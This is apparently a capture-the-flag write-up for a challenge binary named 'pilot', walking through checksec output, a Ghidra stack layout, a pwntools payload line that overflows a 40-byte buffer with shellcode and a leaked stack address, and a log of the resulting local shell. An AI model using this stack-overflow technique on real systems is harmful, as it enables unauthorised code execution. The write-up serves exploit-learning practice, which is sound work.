# pilot Writeup

## Steps

1. Check security of file - NX disabled means stack is executable
```
$ checksec --file=pilot 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No Symbols        No    0               1               pilot
                                                                                                                                                            
```
2. To pop a shell we will write '/bin/sh' to the stack, add padding, and replace the return address with the location of the top of the stack - this location is provided
3. Look at the stack variable layout in ghidra
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         <UNASSIGNED>   <RETURN>
             undefined8        RAX:8          this                                    XREF[1]:     004009f4(W)  
             undefined1[32]    Stack[-0x28]   input                                   XREF[2]:     00400aa4(*), 
                                                                                                   00400acf(*)  
                             main                                            XREF[3]:     entry:004008cd(*), 00400de0, 
                                                                                          00400e80(*)  
```
The input starts writing to `Stack[-0x28]` which is int `40`, so the exploit will have `40 - len(shellcode)` of padding before the new return address

4. Capture the address provided and create the described payload
```
payload = shell_please + b'A' * (40-len(shell_please)) + p64(int(address, 16))
```

## Solution 
```
$ python3 ex_pilot.py 
[+] Starting local process './pilot': pid 15039
[*] Switching to interactive mode
[*]Command:$ ls
ex_pilot.py  pilot  pilot.md
$ w
 22:41:54 up 26 min,  2 users,  load average: 0.74, 1.05, 0.82
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
kali              -                22:16   25:37   0.00s  0.04s lightdm --session-child 13 24
kali              -                22:16   25:37   0.00s  0.38s /usr/lib/systemd/systemd --user
$ exit
[*] Got EOF while reading in interactive
$ 
[*] Process './pilot' stopped with exit code 0 (pid 15039)
[*] Got EOF while sending in interactive                                          

```

